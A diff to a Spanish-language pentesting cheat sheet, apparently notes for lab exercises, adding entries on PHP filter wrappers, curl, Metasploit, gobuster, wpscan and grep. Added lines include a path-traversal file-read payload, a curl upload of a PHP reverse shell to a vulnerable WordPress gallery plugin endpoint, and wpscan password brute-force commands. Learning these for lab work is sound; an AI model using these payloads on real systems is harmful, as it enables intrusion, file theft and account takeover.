@@ -19,6 +19,10 @@
 
 	- require_once: Esta función es clave. Le dice a PHP: Busca este archivo externo y pega su contenido aquí antes de seguir'.
 
+4. Wrappers:
+
+	php://filter/convert.base64-encode/resource=../../../../../path	→ Covierte a base64 así le gusta al path
+
 ----------------------------------------------------------------------------------
 
 	"Python"
@@ -42,6 +46,10 @@
 5. Desencriptar un XOR encrypted:
 
 	python3 -c 'print("".join(chr(b ^ [HEX]) for b in <encrypted>))'
+
+6. Generar shell:
+
+	python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ----------------------------------------------------------------------------------
 
@@ -88,6 +96,14 @@
 
 		Ej: curl -s -o /dev/null -w '%{http_code}\n %{size_download}\n' -H "Host: doesntexist.123.123.123.123" http://123.123.123.123
 
+	-F: Forms
+
+		curl -F 'qqfile=@/usr/share/webshells/php/php-reverse-shell.php' 'http://<IP>/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2025&Month=04'
+
+		- el prefijo @ indica que el valor es una ruta a un archivo que se va a subir, no una cadena de texto.
+
+		- qqfile es el nombre del campo del formulario que espera el servidor
+
 	-I: Sólo headers
 
 		Si la solicitud no acepta "HEAD" se puede hacer:
@@ -97,6 +113,12 @@
 2. Comprobar formularios:
 
 	curl -s -X POST http://<IP>/ruta/ -d "user=admin&pass=wrongpassword"
+
+----------------------------------------------------------------------------------
+
+	"capabilities" - "getcap"
+
+1. Investigar
 
 ----------------------------------------------------------------------------------
 
@@ -208,6 +230,8 @@
 
 	• put: Transferir archivos de nuestra máquina a la máquina remota.
 
+	• passive: salir del modo pasivo
+
 ----------------------------------------------------------------------------------
 
 	"GPG"
@@ -291,6 +315,16 @@
 
 4. Configuración del Objetivo (Target):
 
+	• show options	→ muestra las opciones
+
+	• show advanced → opciones avanzadas
+
+	• show payloads → payloads compatibles con el exploit
+
+	• show targets 	→ versiones/plataformas soportadas
+
+	• show info	→ información completa del módulo
+
 	• Target IP - Port:
 
 		set RHOSTS [IP_objetivo]
@@ -345,6 +379,32 @@
 	• Interact: sessions -i [ID_sesión]
 
 	• Background: CTRL+Z o background
+
+----------------------------------------------------------------------------------
+
+	"sqlmap"
+
+1. Investigar: man sqlmap
+
+----------------------------------------------------------------------------------
+
+	"gobuster"
+
+1. Flags
+
+	dir: busca directorios en el dominio
+
+	vhost: busca hosts parecidas
+
+	-u: url
+
+	-w: wordlist
+
+	--ad: append domain (agrega las palabras del wordlist al dominio)
+
+	-t: threads
+
+	-x: busca por extensiones (para el flag dir)
 
 ----------------------------------------------------------------------------------
 
@@ -421,6 +481,39 @@
 1. Wordpress security scanner
 
 2. Hacer 'man wpscan'
+
+3. Actualizar base de datos:
+
+	wpscan --update
+
+4. Forzar a buscar usuarios:
+
+	wpscan [URL] --enumerate u
+
+5. Si ya se tienen usuarios:
+
+	wpscan [URL] --usernames <users> --passwords <passwords> 
+
+	Nota: Se pueden pasar archivos en <users> y <passwords>
+
+6. Se recomienda usar el flag '--no-banner' para no mostrar el banner (es un poco fastidioso)
+
+7. Flags útiles adicionales
+
+	--max-threads | -t <value>	→ Paralelizar requests (cuidado con rate limiting / defaul 5)
+
+	--password-attack wp-login	→ Fuerza el ataque al endpoint /wp-login.php
+
+	--password-attack xmlrpc	→ Usa xmlrpc.php en su lugar (más rápido, permite múltiples intentos por request)
+	
+	--api-token <token>		→ Para vulnerability scanning (gratis en wpscan.com)
+
+		-e			→ enumerate (ver en manual)
+
+8. Si el login está en una ruta personalizada:
+
+	wpscan --url http://target.thm --login-uri /tu-ruta-custom
+
 
 ---------------------------------------------------------------------------------
 
@@ -502,6 +595,20 @@
 		• -in key_rsa	→ archivo de entrada
 		• -text		→ muestra los componentes en formato legible
 		• -noout	→ no imprime en Base64, sólo texto. 
+
+---------------------------------------------------------------------------------
+
+	"grep"
+
+1. Flags muy útiles:
+
+	-v: Omite el match que le pasemos
+
+	-i: Insensitive case
+
+	-E: Regex
+
+	-n: Número de línea
 
 ---------------------------------------------------------------------------------
 
